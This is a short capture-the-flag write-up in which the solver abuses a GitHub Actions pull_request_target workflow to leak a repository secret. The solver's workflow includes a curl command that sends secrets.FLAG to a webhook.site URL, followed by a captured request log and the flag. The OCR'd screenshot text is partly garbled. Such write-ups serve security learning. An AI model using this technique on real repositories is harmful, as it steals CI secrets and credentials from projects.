# Fork Knife
> You must solve the second challenge to get the answer, all you need is inside the Loby.

## About the Challenge
We were given a repository whose flags are located in the GitHub workflow


[Image extracted text: challenge-2-daffainfo
github
workflows
grade.yml
(
maclarel    Initial commit
Code
Blame
30
lines
(26
loc )
779 Bytes
on:
pull_request_target
jobs:
5
build:
name:
Grade
the
test
7
runs-on:
ubuntu-latest
8
steps:
10
uses:
actions/checkout@v2
11
with:
12
ref:
S{{ github.event.pull_request.head . sha
}}
13
14
name
Run
build
tests
15
id:
build_and_test
16
env:
17
EXPECTED_OUTPUT =
S{{
secrets.FLAG
}}
18
run:
19
Ibin/bash
Ibuild.sh
output
txt
&& /bin/bash
Itest. sh
20
21
uses:
actions/github-script@v3]


## How to Solve?
To get the flag, I created another workflow like this

```yaml
ame: Say Hi

 on: [pull_request]

 jobs:
   build:

     runs-on: ubuntu-latest

     steps:
     - uses: actions/checkout@v2
     - name: Say Hi
       run: |
         curl "https://webhook.site/b7c7b30c-1536-4672-a15c-646bcd1ef28e?username=${{ secrets.FLAG }}"
```

This workflow will send the flag to `webhook.site` using `curl` command, and then create a pull request to trigger the workflow


[Image extracted text: Request Details
Permalink
Raw content
Copy as
Headers
GET
https:IIwebhook sitelb7c7b3Oc-1536-4672-a15c-646bcd1ef28e?usernam
connection
close
e-EKOpr3v3nt_PWN_r3qu3stS
accept
*x
Host
40.84.177.133
Whois
Shodan
Netify   Censys
user-agent
curl/7.81.0
Date
01/11/2023 22.35.21 (2 days ago)
host
webhook. site
Size
0 bytes
content-length
ID
11ce3da7-9c9b-4e34-a023-fd980d12b522
content-type
Files
Query strings
Form values
username
EKOpr3v3nt
PW_raqu3sts
(empty)
No content]


```
EKO{pr3v3nt_PWN_r3qu3stS}
```